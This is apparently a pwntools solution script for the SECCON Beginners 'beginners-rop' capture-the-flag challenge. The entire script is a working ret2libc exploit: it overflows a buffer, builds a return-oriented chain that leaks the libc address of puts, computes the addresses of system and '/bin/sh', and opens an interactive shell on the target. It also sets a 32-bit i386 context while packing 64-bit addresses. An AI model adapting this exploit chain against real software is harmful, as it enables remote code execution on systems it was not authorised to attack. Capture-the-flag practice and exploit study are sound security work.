#!/usr/bin/python3
from pwn import *
import sys

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./chall"
HOST = "beginners-rop.quals.beginners.seccon.jp"
PORT = 4102

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

elf = ELF(FILE_NAME)
addr_main = elf.symbols["main"]
plt_puts = elf.plt["puts"]
got_puts = elf.got["puts"]
rdi_ret = 0x401283
only_ret = 0x401284
#
libc = ELF('./libc-2.27.so')
off_puts = libc.symbols["puts"]
off_system = libc.symbols["system"]
off_binsh = next(libc.search(b"/bin/sh"))

def exploit():
	buflen = 0x100+8
	payload = b"A"*buflen
	payload += p64(rdi_ret)
	payload += p64(got_puts)
	payload += p64(plt_puts)
	payload += p64(addr_main)
	conn.sendline(payload)
	conn.recvline()
	libc_puts = u64(conn.recvline()[:-1]+b"\x00\x00")
	libc_base = libc_puts - off_puts
	libc_system = libc_base + off_system
	libc_binsh = libc_base + off_binsh
	print(hex(libc_puts))
	
	payload = b"A"*buflen
	payload += p64(only_ret) # to avoid segmentation fault
	payload += p64(rdi_ret)
	payload += p64(libc_binsh)
	payload += p64(libc_system)
	conn.sendline(payload)

	conn.interactive()	

if __name__ == "__main__":
	exploit()	
